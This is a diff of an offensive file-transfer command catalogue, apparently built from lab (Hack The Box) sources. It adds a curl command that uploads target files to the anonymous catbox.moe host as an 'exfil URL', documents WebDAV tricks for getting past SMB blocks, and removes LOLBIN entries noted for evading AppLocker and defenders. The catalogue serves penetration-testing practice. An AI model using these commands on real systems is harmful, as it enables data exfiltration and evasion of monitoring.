@@ -1062,43 +1062,24 @@
       "source": "htb"
     },
     {
-      "id": "cross_transfer_sh",
-      "label": "transfer.sh (public pastebin)",
-      "command": "curl --upload-file {filename} https://transfer.sh/{filename}",
+      "id": "cross_catbox",
+      "label": "catbox.moe (public pastebin)",
+      "command": "curl -F 'reqtype=fileupload' -F 'fileToUpload=@{filename}' https://catbox.moe/user/api.php",
       "meta": [
         "cross",
         "service",
         "upload",
         "medium"
       ],
-      "notes": "Uploads to public file pastebin. Returns a shareable URL on stdout you can fetch from anywhere. Files expire after ~14 days. Useful when you can't host your own server (egress-limited target).",
+      "notes": "Uploads to public file pastebin. Returns a shareable URL on stdout. Files persist indefinitely (host removes only on report). Anonymous, no signup. Tested working 2026-04.",
       "ua": "curl/8.x.x",
       "references": [
         {
-          "label": "transfer.sh on GitHub",
-          "url": "https://github.com/dutchcoders/transfer.sh"
+          "label": "catbox.moe API",
+          "url": "https://catbox.moe/tools.php"
         }
       ],
-      "source": "community"
-    },
-    {
-      "id": "cross_0x0_st",
-      "label": "0x0.st (public pastebin)",
-      "command": "curl -F'file=@{filename}' https://0x0.st",
-      "meta": [
-        "cross",
-        "service",
-        "upload",
-        "medium"
-      ],
-      "notes": "Uploads to public file pastebin. Returns a shareable URL on stdout. Smaller files expire after months, larger files after a year. Anonymous, no signup.",
-      "ua": "curl/8.x.x",
-      "references": [
-        {
-          "label": "0x0.st",
-          "url": "https://0x0.st/"
-        }
-      ],
+      "when": "Egress-limited target where you can't host your own server. Need a one-shot exfil URL.",
       "source": "community"
     },
     {
@@ -1141,7 +1122,7 @@
         "stealth",
         "srv:webdav"
       ],
-      "notes": "Looks like SMB but rides over HTTP/80 \u2014 bypasses TCP/445 outbound blocks. Server side: sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous. The magic 'DavWWWRoot' path triggers Windows to switch to WebDAV when SMB isn't reachable.",
+      "notes": "Looks like SMB but rides over HTTP/80 \u2014 bypasses TCP/445 outbound blocks. Requires the WebClient service running on the target (the mini-redirector that translates UNC over HTTP). Win10/11 desktop: ships enabled. Windows Server: needs the Desktop Experience feature \u2014 vanilla Server SKU has no WebClient service and this technique fails with 'network path not found'. Server side: sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous. The magic 'DavWWWRoot' path triggers Windows to switch to WebDAV when SMB isn't reachable.",
       "references": [
         {
           "label": "WebDAV RFC 4918",
@@ -1153,13 +1134,13 @@
         }
       ],
       "usage": "sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous",
-      "when": "TCP/445 (SMB) outbound is BLOCKED but HTTP/80 works \u2014 WebDAV rides over HTTP via UNC paths.",
+      "when": "TCP/445 (SMB) outbound is BLOCKED but HTTP/80 works \u2014 WebDAV rides over HTTP via UNC paths. Target must be Win10/11 desktop or Server with Desktop Experience.",
       "source": "htb"
     },
     {
       "id": "cmd_ftp_script",
       "label": "cmd \u2014 FTP command file",
-      "command": "echo open {ip} > ftp.txt\necho USER anonymous >> ftp.txt\necho binary >> ftp.txt\necho GET {filename} >> ftp.txt\necho bye >> ftp.txt\nftp -v -n -s:ftp.txt",
+      "command": "echo open {ip} > ftp.txt\necho USER anonymous >> ftp.txt\necho anonymous >> ftp.txt\necho binary >> ftp.txt\necho GET {filename} >> ftp.txt\necho bye >> ftp.txt\nftp -v -n -s:ftp.txt",
       "meta": [
         "windows",
         "cmd",
@@ -1177,29 +1158,6 @@
         }
       ],
       "usage": "sudo python3 -m pyftpdlib --port 21",
-      "source": "htb"
-    },
-    {
-      "id": "win_gfxdownload",
-      "label": "cmd \u2014 GfxDownloadWrapper (Intel LOLBIN)",
-      "command": "GfxDownloadWrapper.exe \"http://{ip}:{port}/{filename}\" \"{win_out}\"",
-      "meta": [
-        "windows",
-        "cmd",
-        "lolbin",
-        "download",
-        "stealth",
-        "srv:http"
-      ],
-      "notes": "Intel Graphics Driver utility. Pre-installed on most Intel-based laptops. INTEL-signed (not Microsoft) \u2014 bypasses AppLocker rules that allow only Microsoft. Almost no defender monitors graphics driver utilities.",
-      "references": [
-        {
-          "label": "LOLBAS \u2014 GfxDownloadWrapper",
-          "url": "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Gfxdownloadwrapper/"
-        }
-      ],
-      "usage": "python3 -m http.server {port}",
-      "when": "AppLocker permits Microsoft-signed binaries but blocks PowerShell. Intel-signed LOLBIN \u2014 almost no defenders monitor it.",
       "source": "htb"
     },
     {
@@ -1436,7 +1394,7 @@
         "stealth",
         "srv:webdav"
       ],
-      "notes": "Upload via WebDAV \u2014 looks like SMB but rides over HTTP/80. Bypasses TCP/445 outbound blocks. Server side: sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous (mark share as Read-Write).",
+      "notes": "Upload via WebDAV \u2014 looks like SMB but rides over HTTP/80. Bypasses TCP/445 outbound blocks. Requires the WebClient service running on the target (built into Win10/11 desktop; needs Desktop Experience feature on Windows Server). Server side: sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous (mark share as Read-Write).",
       "references": [
         {
           "label": "WebDAV RFC 4918",
@@ -1449,7 +1407,7 @@
     {
       "id": "cmd_ftp_script_upload",
       "label": "cmd \u2014 FTP command file (PUT)",
-      "command": "echo open {ip} > ftp.txt\necho USER anonymous >> ftp.txt\necho binary >> ftp.txt\necho PUT {filename} >> ftp.txt\necho bye >> ftp.txt\nftp -v -n -s:ftp.txt",
+      "command": "echo open {ip} > ftp.txt\necho USER anonymous >> ftp.txt\necho anonymous >> ftp.txt\necho binary >> ftp.txt\necho PUT {filename} >> ftp.txt\necho bye >> ftp.txt\nftp -v -n -s:ftp.txt",
       "meta": [
         "windows",
         "cmd",
@@ -1973,29 +1931,6 @@
         {
           "label": "LOLBAS \u2014 Hh.exe",
           "url": "https://lolbas-project.github.io/lolbas/Binaries/Hh/"
-        }
-      ]
-    },
-    {
-      "id": "cmd_replace_smb",
-      "label": "cmd \u2014 Replace.exe via SMB UNC",
-      "command": "replace.exe \\\\{ip}\\share\\{filename} {win_out} /A",
-      "meta": [
-        "windows",
-        "cmd",
-        "lolbin",
-        "download",
-        "stealth",
-        "srv:smb"
-      ],
-      "notes": "replace.exe normally replaces files in a destination directory. /A flag adds source files that don't exist in the destination \u2014 turns it into a copy. SMB UNC source. Microsoft-signed, rarely monitored.",
-      "source": "htb",
-      "usage": "sudo impacket-smbserver share -smb2support /tmp/smbshare",
-      "when": "Less common SMB copy alternative. Use when copy.exe / esentutl / xcopy are watched but replace.exe isn't.",
-      "references": [
-        {
-          "label": "LOLBAS \u2014 Replace",
-          "url": "https://lolbas-project.github.io/lolbas/Binaries/Replace/"
         }
       ]
     },
